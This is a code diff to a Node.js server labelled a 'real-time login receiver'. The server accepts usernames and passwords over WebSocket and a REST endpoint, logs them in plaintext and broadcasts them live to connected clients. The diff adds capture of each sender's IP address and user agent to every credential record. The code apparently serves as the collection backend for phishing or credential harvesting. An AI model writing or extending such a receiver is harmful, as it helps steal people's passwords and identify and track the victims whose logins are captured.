@@ -10,18 +10,40 @@ const wss = new WebSocket.Server({ server });
 app.use(cors());
 app.use(express.json());
 
+// Middleware to get client IP
+app.use((req, res, next) => {
+    req.clientIP = req.headers['x-forwarded-for'] || 
+                  req.headers['x-real-ip'] || 
+                  req.connection.remoteAddress || 
+                  req.socket.remoteAddress ||
+                  (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
+                  req.ip;
+    next();
+});
+
 // Store connected clients
 const clients = new Set();
 
 // WebSocket connection handler
-wss.on('connection', (ws) => {
-    console.log('✅ New client connected');
+wss.on('connection', (ws, req) => {
+    // Get client IP from WebSocket connection
+    const clientIP = req.headers['x-forwarded-for'] || 
+                     req.headers['x-real-ip'] || 
+                     req.connection.remoteAddress || 
+                     req.socket.remoteAddress ||
+                     (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    
+    console.log('✅ New client connected from IP:', clientIP);
     clients.add(ws);
+    
+    // Store IP with the WebSocket connection
+    ws.clientIP = clientIP;
 
     // Send welcome message
     ws.send(JSON.stringify({
         type: 'connection',
         message: 'Connected to real-time login receiver',
+        clientIP: clientIP,
         timestamp: new Date().toISOString()
     }));
 
@@ -29,9 +51,10 @@ wss.on('connection', (ws) => {
     ws.on('message', (data) => {
         try {
             const message = JSON.parse(data);
-            console.log('\n📨 Received login credentials:');
+            console.log('\n📨 Received login credentials via WebSocket:');
             console.log('Username:', message.username);
             console.log('Password:', message.password);
+            console.log('Client IP:', clientIP);
             console.log('Timestamp:', message.timestamp);
             console.log('---');
 
@@ -40,6 +63,7 @@ wss.on('connection', (ws) => {
                 type: 'login',
                 username: message.username,
                 password: message.password,
+                clientIP: clientIP,
                 timestamp: message.timestamp,
                 receivedAt: new Date().toISOString()
             });
@@ -51,13 +75,13 @@ wss.on('connection', (ws) => {
 
     // Handle client disconnect
     ws.on('close', () => {
-        console.log('❌ Client disconnected');
+        console.log('❌ Client disconnected from IP:', clientIP);
         clients.delete(ws);
     });
 
     // Handle errors
     ws.on('error', (error) => {
-        console.error('WebSocket error:', error);
+        console.error('WebSocket error from IP', clientIP, ':', error);
     });
 });
 
@@ -73,10 +97,13 @@ function broadcastToClients(data) {
 // REST API endpoint (optional - for testing)
 app.post('/api/receive-login', (req, res) => {
     const { username, password, timestamp } = req.body;
+    const clientIP = req.clientIP;
 
     console.log('\n📨 Received via REST API:');
     console.log('Username:', username);
     console.log('Password:', password);
+    console.log('Client IP:', clientIP);
+    console.log('User Agent:', req.headers['user-agent']);
     console.log('Timestamp:', timestamp);
     console.log('---');
 
@@ -85,6 +112,8 @@ app.post('/api/receive-login', (req, res) => {
         type: 'login',
         username: username,
         password: password,
+        clientIP: clientIP,
+        userAgent: req.headers['user-agent'],
         timestamp: timestamp,
         receivedAt: new Date().toISOString()
     });
